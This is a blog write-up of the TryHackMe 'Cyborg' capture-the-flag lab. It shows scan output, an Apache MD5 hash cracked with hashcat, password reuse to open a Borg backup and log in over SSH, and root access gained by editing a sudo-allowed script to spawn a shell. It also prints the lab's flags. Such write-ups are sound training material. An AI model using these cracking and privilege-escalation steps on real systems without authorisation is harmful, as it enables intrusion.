@@ -1,0 +1,272 @@
+---
+layout: post
+title:  "Cyborg - TryHackMe"
+author: "dnstun0 (Jim Keeler)"
+date:   2021-12-25 17:11:04 -0500
+categories: tryhackme writeup
+---
+## Initial Enumeration
+Let's start with a scan to see what kind of attack surface we're working with.
+
+```text
+Starting Nmap 7.92 ( https://nmap.org ) at 2021-12-25 21:17 EST
+Nmap scan report for cyborg (cyborg)
+Host is up (0.16s latency).
+Not shown: 998 closed tcp ports (conn-refused)
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 db:b2:70:f3:07:ac:32:00:3f:81:b8:d0:3a:89:f3:65 (RSA)
+|   256 68:e6:85:2f:69:65:5b:e7:c6:31:2c:8e:41:67:d7:ba (ECDSA)
+|_  256 56:2c:79:92:ca:23:c3:91:49:35:fa:dd:69:7c:ca:ab (ED25519)
+80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
+|_http-server-header: Apache/2.4.18 (Ubuntu)
+|_http-title: Apache2 Ubuntu Default Page: It works
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 48.63 seconds
+```
+
+Two ports open! I like when there are only a couple of ports open. It means fewer things to look at and less chance of a dead end.
+
+Let's hit the web port with our browser and see what comes up.
+
+![The default page](/assets/img/20211225211540.png)
+
+A default page won't get us anything useful, so the next step is to run a directory buster. I've been playing with [feroxbuster](https://github.com/epi052/feroxbuster) recently, so we'll use that to see what comes up.
+
+![feroxbuster output](/assets/img/20211225212231.png)
+
+Ooh, an admin panel!
+
+![An admin panel](/assets/img/20211225212342.png)
+
+There's almost nothing here, but under the "Archive" menu there's a download link for an archive tarball (`archive.tar`).
+
+## Examining the Archive
+
+If the filename hasn't given it away, the folder structure indicates this is clearly a backup archive.
+
+```text
+home/field/dev/final_archive/
+home/field/dev/final_archive/hints.5
+home/field/dev/final_archive/integrity.5
+home/field/dev/final_archive/config
+home/field/dev/final_archive/README
+home/field/dev/final_archive/nonce
+home/field/dev/final_archive/index.5
+home/field/dev/final_archive/data/
+home/field/dev/final_archive/data/0/
+home/field/dev/final_archive/data/0/5
+home/field/dev/final_archive/data/0/3
+home/field/dev/final_archive/data/0/4
+home/field/dev/final_archive/data/0/1
+```
+
+The _README_ file helps us identify what software created it.
+
+
+```text
+This is a Borg Backup repository.
+See https://borgbackup.readthedocs.io/
+```
+<div style="text-align: center; font-style: italic; font-size: 12px">home/field/dev/final_archive/README</div>
+
+Let's go read some [documentation](https://borgbackup.readthedocs.io/)! The [Quick Start](https://borgbackup.readthedocs.io/en/stable/quickstart.html) guide has exactly what we'll need. Step four desribes how to list all archives in a repository, which seems like a reasonable first probe to see what we're working with. First we'll need the Borg command utility installed. I didn't want to install another package on my machine I'll never touch again, so I grabbed the latest binaries from their [releases page](https://github.com/borgbackup/borg/releases) and tried the list command.
+
+```console
+$ borg-dir/borg.exe list home/field/dev/final_archive
+Enter passphrase for key /home/iptunneler/thm/cyborg/home/field/dev/final_archive: 
+```
+<div style="text-align: center; font-style: italic; font-size: 12px">List the archive contents</div>
+
+Blocked! We need a password to access the archive. Let's go back and dig around the admin panel for more clues.
+
+## Enumeration Continued
+
+There's an "Admin Shoutbox" page that looks like a chat log.
+
+```text
+[Today at 5.45am from Alex]
+Ok sorry guys i think i messed something up, uhh i was playing around with the squid proxy i mentioned earlier.
+I decided to give up like i always do ahahaha sorry about that.
+I heard these proxy things are supposed to make your website secure but i barely know how to use it so im probably making it more insecure in the process.
+Might pass it over to the IT guys but in the meantime all the config files are laying about.
+And since i dont know how it works im not sure how to delete them hope they don't contain any confidential information lol.
+other than that im pretty sure my backup "music_archive" is safe just to confirm.
+```
+<div style="text-align: center; font-style: italic; font-size: 12px">Chat logs provide a clue</div>
+
+This message explains some of the feroxbuster results we skipped over earlier. The `/etc/squid` path gives us a directory listing with the squid proxy config and a _passwd_ file.
+
+```text
+music_archive:$apr1$BpZ.Q.1m$F0qqPwHSOG50URuOVQTTn.
+```
+<div style="text-align: center; font-style: italic; font-size: 12px">/etc/squid/passwd</div>
+
+```text
+auth_param basic program /usr/lib64/squid/basic_ncsa_auth /etc/squid/passwd
+auth_param basic children 5
+auth_param basic realm Squid Basic Authentication
+auth_param basic credentialsttl 2 hours
+acl auth_users proxy_auth REQUIRED
+http_access allow auth_users
+```
+<div style="text-align: center; font-style: italic; font-size: 12px">/etc/squid/squid.conf</div>
+
+## Password Cracking
+
+Using `hash-identifier`, we can figure out what kind of hash we're dealing with.
+
+```console
+$ hash-identifier
+   #########################################################################
+   #     __  __                     __           ______    _____           #
+   #    /\ \/\ \                   /\ \         /\__  _\  /\  _ `\         #
+   #    \ \ \_\ \     __      ____ \ \ \___     \/_/\ \/  \ \ \/\ \        #
+   #     \ \  _  \  /'__`\   / ,__\ \ \  _ `\      \ \ \   \ \ \ \ \       #
+   #      \ \ \ \ \/\ \_\ \_/\__, `\ \ \ \ \ \      \_\ \__ \ \ \_\ \      #
+   #       \ \_\ \_\ \___ \_\/\____/  \ \_\ \_\     /\_____\ \ \____/      #
+   #        \/_/\/_/\/__/\/_/\/___/    \/_/\/_/     \/_____/  \/___/  v1.2 #
+   #                                                             By Zion3R #
+   #                                                    www.Blackploit.com #
+   #                                                   Root@Blackploit.com #
+   #########################################################################
+--------------------------------------------------
+ HASH: $apr1$BpZ.Q.1m$F0qqPwHSOG50URuOVQTTn.
+
+Possible Hashs:
+[+] MD5(APR)
+--------------------------------------------------
+ HASH: 
+```
+
+MD5(APR); that's [hash-mode](https://hashcat.net/wiki/doku.php?id=example_hashes) 1600 in hashcat. Let's see if we can crack it.
+
+```console?prompt=>
+$ hashcat -m1600 -a0 --show '$apr1$BpZ.Q.1m$F0qqPwHSOG50URuOVQTTn.' /usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt
+$apr1$BpZ.Q.1m$F0qqPwHSOG50URuOVQTTn.:squidward
+```
+<div style="text-align: center; font-style: italic; font-size: 12px">Using hashcat to crack the squid hash</div>
+
+## Unlocking the Archive
+
+Great! Hopefully the admin likes to re-use passwords. Let's see if it we can use it to unlock the backup archive.
+
+```console
+$ borg-dir/borg.exe list home/field/dev/final_archive
+Enter passphrase for key /home/iptunneler/thm/cyborg/home/field/dev/final_archive: 
+music_archive                        Tue, 2020-12-29 09:00:38 [f789ddb6b0ec108d130d16adebf5713c29faf19c44cad5e1eeb8ba37277b1c82]
+```
+<div style="text-align: center; font-style: italic; font-size: 12px">Try listing the archive again with the cracked password</div>
+
+Another win! Okay, let's unpack it and see what's inside.
+
+```console
+$ borg-dir/borg.exe extract home/field/dev/final_archive::music_archive
+Enter passphrase for key /home/iptunneler/thm/cyborg/home/field/dev/final_archive:
+$ find home/alex -not -path "home/alex/.config/*" -not -path "home/alex/.dbus/*"
+home/alex
+home/alex/.bashrc
+home/alex/.bash_logout
+home/alex/.profile
+home/alex/Music
+home/alex/.bash_history
+home/alex/.dbus
+home/alex/.config
+home/alex/Documents
+home/alex/Documents/note.txt
+home/alex/Public
+home/alex/Videos
+home/alex/Desktop
+home/alex/Desktop/secret.txt
+home/alex/Downloads
+home/alex/Templates
+home/alex/Pictures
+$ cat home/alex/Documents/note.txt
+Wow I'm awful at remembering Passwords so I've taken my Friends advice and noting them down!
+
+alex:S3cretP@s3
+```
+<div style="text-align: center; font-style: italic; font-size: 12px">Explore the extracted archive</div>
+
+## Gaining User Access
+
+Looks like some plaintext credentials to me. Let's try them on the SSH port.
+```console
+$ ssh alex@cyborg
+The authenticity of host 'cyborg (10.10.123.70)' can't be established.
+ECDSA key fingerprint is SHA256:uB5ulnLcQitH1NC30YfXJUbdLjQLRvGhDRUgCSAD7F8.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added 'cyborg,10.10.123.70' (ECDSA) to the list of known hosts.
+alex@cyborg's password: 
+Welcome to Ubuntu 16.04.7 LTS (GNU/Linux 4.15.0-128-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+
+
+27 packages can be updated.
+0 updates are security updates.
+
+
+The programs included with the Ubuntu system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
+applicable law.
+
+alex@ubuntu:~$ ls -al user.txt
+-r-xr--r-- 1 alex alex 40 Dec 30  2020 user.txt
+alex@ubuntu:~$ cat user.txt
+flag{1_hop3_y0u_ke3p_th3_arch1v3s_saf3}
+alex@ubuntu:~$ 
+```
+<div style="text-align: center; font-style: italic; font-size: 12px">Try the credentials on the SSH service</div>
+
+## Privilege Escalation
+
+Initial user access accomplished. Now on to gaining root. Let's see what `alex` can sudo.
+
+```console
+alex@ubuntu:~$ sudo -l
+Matching Defaults entries for alex on ubuntu:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User alex may run the following commands on ubuntu:
+    (ALL : ALL) NOPASSWD: /etc/mp3backups/backup.sh
+alex@ubuntu:~$ ls -al /etc/mp3backups/backup.sh
+-r-xr-xr-- 1 alex alex 1083 Dec 30  2020 /etc/mp3backups/backup.sh
+alex@ubuntu:~$ 
+```
+<div style="text-align: center; font-style: italic; font-size: 12px">Check sudo permissions for alex</div>
+
+It doesn't get easier than a writable custom script. All we need to do is add the write permission to the file and add a line to the script that spawns a new shell.
+
+```console
+alex@ubuntu:~$ chmod u+w /etc/mp3backups/backup.sh
+alex@ubuntu:~$ vi /etc/mp3backups/backup.sh
+```
+<div style="text-align: center; font-style: italic; font-size: 12px">Add write permissions and edit the backup script</div>
+
+```bash
+#!/bin/bash
+sudo /bin/bash  # Added
+exit 0          # Added
+sudo find / -name "*.mp3" | sudo tee /etc/mp3backups/backed_up_files.txt
+...
+```
+<div style="text-align: center; font-style: italic; font-size: 12px">/etc/mp3backups/backup.sh - Modified to spawn a root shell</div>
+
+```console
+alex@ubuntu:~$ sudo /etc/mp3backups/backup.sh
+root@ubuntu:/root# cd /root
+root@ubuntu:/root# ls -al root.txt
+-r-xr--r-- 1 root root 43 Dec 30  2020 root.txt
+root@ubuntu:/root# cat root.txt
+flag{Than5s_f0r_play1ng_H0p£_y0u_enJ053d}
+root@ubuntu:/root# 
+```
